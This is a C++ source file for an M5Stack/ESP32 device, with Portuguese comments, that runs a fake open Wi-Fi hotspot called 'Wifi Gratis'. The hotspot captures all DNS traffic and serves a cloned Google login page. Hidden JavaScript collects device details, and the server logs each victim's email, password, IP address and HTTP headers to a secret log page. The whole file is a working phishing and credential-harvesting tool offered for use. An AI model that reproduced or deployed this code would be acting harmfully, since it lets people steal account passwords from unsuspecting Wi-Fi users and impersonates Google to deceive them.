#include "globals.h"
#include "fake_ap.h"
#include "wifi_menu.h"

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

DNSServer dnsServer;
WebServer server(80);

const char* ap_ssid = "Wifi Gratis";

// <<< 1. ESTRUTURA DE DADOS REFORMULADA (SEM GEOLOCALIZAÇÃO) >>>
struct Credential {
  String username;
  String password;
  String ip_address;
  String all_headers;
  String screen_res;
  String timezone;
  String language;
  String platform;
};

#define MAX_CREDS 10
Credential capturedCredentials[MAX_CREDS];
int credsCount = 0;


// <<< 2. PÁGINA DE LOGIN ATUALIZADA COM JAVASCRIPT PARA CAPTURA PASSIVA >>>
const char* loginPageHTML = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Fazer login - Contas Google</title>
<style>
body{font-family: 'Roboto', sans-serif; background-color:#fff; margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh;}
.card{border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:360px; box-sizing: border-box;}
.logo-text{font-size:32px; font-weight:700; letter-spacing:-1px; text-align:center; margin:0 auto 16px;}
h1{font-size:24px; color:#202124; text-align:center; font-weight:400; margin:0;}
p{font-size:16px; color:#202124; text-align:center; font-weight:400; margin-top:8px;}
.form-container{margin-top:24px;}
input{width:calc(100% - 24px); height:28px; padding:13px 15px; font-size:16px; border:1px solid #ccc; border-radius:4px; margin-bottom:16px;}
.btn-container{display:flex; justify-content:flex-end; margin-top:24px;}
button{background-color:#1a73e8; color:#fff; font-size:14px; font-weight:500; border:none; border-radius:4px; padding: 0 24px; height:36px; cursor:pointer;}
</style></head>
<body><div class="card">
<div class="logo-text"><span style="color:#4285F4;">G</span><span style="color:#EA4335;">o</span><span style="color:#FBBC05;">o</span><span style="color:#4285F4;">g</span><span style="color:#34A853;">l</span><span style="color:#EA4335;">e</span></div>
<h1>Fazer login</h1><p>Use sua Conta Google</p>
<form id="loginForm" class="form-container" action="/login" method="POST" onsubmit="event.preventDefault(); submitWithData();">
<input type="text" name="username" placeholder="E-mail ou telefone" required><input type="password" name="password" placeholder="Digite sua senha" required>
<div class="btn-container"><button type="submit">Avançar</button></div>
</form></div>
<script>
function submitWithData() {
  const form = document.getElementById('loginForm');
  addHiddenInput(form, 'screen_res', screen.width + 'x' + screen.height);
  addHiddenInput(form, 'timezone', Intl.DateTimeFormat().resolvedOptions().timeZone);
  addHiddenInput(form, 'language', navigator.language);
  addHiddenInput(form, 'platform', navigator.platform);
  form.submit();
}
function addHiddenInput(form, key, value) {
  const input = document.createElement('input');
  input.type = 'hidden';
  input.name = key;
  input.value = value;
  form.appendChild(input);
}
</script></body></html>
)rawliteral";


const char* successPageHTML = R"rawliteral(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sucesso</title>
<style>
html,body{font-family: 'Roboto', sans-serif; background-color:#F8F9FA; margin:0; padding:0; display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;}
.container{background-color:white; padding: 40px; border-radius:12px; box-shadow: 0 4px 8px rgba(0,0,0,0.1);}
h1{color:#2E7D32; font-size:24px;}
p{color:#424242; font-size:16px;}
</style></head>
<body><div class="container"><h1>Login efetuado com sucesso!</h1><p>A sua conexão com a internet foi estabelecida.<br>Pode fechar esta página.</p></div></body></html>
)rawliteral";


// <<< 3. handleLogin ATUALIZADO PARA OS NOVOS DADOS >>>
void handleLogin() {
  if (credsCount < MAX_CREDS) {
    int i = credsCount;
    capturedCredentials[i].username = server.arg("username");
    capturedCredentials[i].password = server.arg("password");
    capturedCredentials[i].ip_address = server.client().remoteIP().toString();
    
    // Captura de todos os cabeçalhos HTTP
    String headers = "";
    for (uint8_t j = 0; j < server.headers(); j++) {
      headers += server.headerName(j) + ": " + server.header(j) + "\n";
    }
    capturedCredentials[i].all_headers = headers;

    // Captura dos dados enviados pelo JavaScript
    capturedCredentials[i].screen_res = server.arg("screen_res");
    capturedCredentials[i].timezone = server.arg("timezone");
    capturedCredentials[i].language = server.arg("language");
    capturedCredentials[i].platform = server.arg("platform");
    
    credsCount++;
    Serial.printf("Nova credencial #%d capturada do IP %s!\n", credsCount, capturedCredentials[i].ip_address.c_str());
  } else {
    Serial.println("Limite de credenciais atingido.");
  }
  server.send(200, "text/html", successPageHTML);
}

// <<< 4. PÁGINA DE LOGS ATUALIZADA PARA EXIBIR OS NOVOS DADOS >>>
void handleLogs() {
  String html = "<html><head><title>Logs</title><meta http-equiv='refresh' content='10'>";
  html += "<style>body{font-family:monospace; background-color:#1e1e1e; color:#d4d4d4;} .log{border:1px solid #555; border-radius:8px; padding:15px; margin:15px; background-color:#252526; box-shadow: 0 2px 5px rgba(0,0,0,0.3);} h1{color:#4EC9B0; text-align:center;} b{color:#9CDCFE;} pre{white-space:pre-wrap; word-wrap:break-word;}</style>";
  html += "</head><body><h1>Logs de Acesso</h1>";
  
  if (credsCount > 0) {
    for (int i = 0; i < credsCount; i++) {
      html += "<div class='log'>";
      html += "<p><b>[Login #" + String(i + 1) + "]</b></p>";
      html += "<p><b>IP Address:</b> " + capturedCredentials[i].ip_address + "</p>";
      html += "<p><b>Username:</b> " + capturedCredentials[i].username + "</p>";
      html += "<p><b>Password:</b> " + capturedCredentials[i].password + "</p>";
      html += "<hr><p><b>Client Info (JS):</b></p>";
      html += "<p><b>Resolucao:</b> " + capturedCredentials[i].screen_res + "</p>";
      html += "<p><b>Fuso Horario:</b> " + capturedCredentials[i].timezone + "</p>";
      html += "<p><b>Idioma:</b> " + capturedCredentials[i].language + "</p>";
      html += "<p><b>Plataforma:</b> " + capturedCredentials[i].platform + "</p>";
      html += "<hr><p><b>HTTP Headers:</b></p>";
      html += "<pre>" + capturedCredentials[i].all_headers + "</pre>";
      html += "</div>";
    }
  } else {
    html += "<p style='text-align:center;'>Nenhuma credencial capturada ainda. Atualizando em 10s...</p>";
  }
  
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleNotFound() {
  server.send(200, "text/html", loginPageHTML);
}

void setupFakeAP() {
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(10, 10);
  M5.Lcd.println("Ativando AP Falso...");
  Serial.println("Iniciando AP Falso...");
  
  credsCount = 0;
  
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid);
  IPAddress apIP = WiFi.softAPIP();

  dnsServer.start(53, "*", apIP);
  
  server.on("/", handleNotFound);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/rotaparaverlogins", handleLogs);
  server.onNotFound(handleNotFound);
  server.begin();

  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setCursor(10, 10);
  M5.Lcd.setTextColor(RED);
  M5.Lcd.println("--- AP FALSO ATIVO ---");
  M5.Lcd.setTextColor(WHITE);
  M5.Lcd.printf("\nSSID: %s\n", ap_ssid);
  M5.Lcd.printf("IP: %s\n", apIP.toString().c_str());
  M5.Lcd.println("\n\nPressione o botao M5\npara parar e voltar.");
}

void loopFakeAP() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (M5.BtnA.wasPressed()) {
    Serial.println("Parando AP Falso...");
    server.stop();
    dnsServer.stop();
    WiFi.softAPdisconnect(true);
    
    currentScreen = WIFI_MENU;
    drawWifiMenu();
  }
}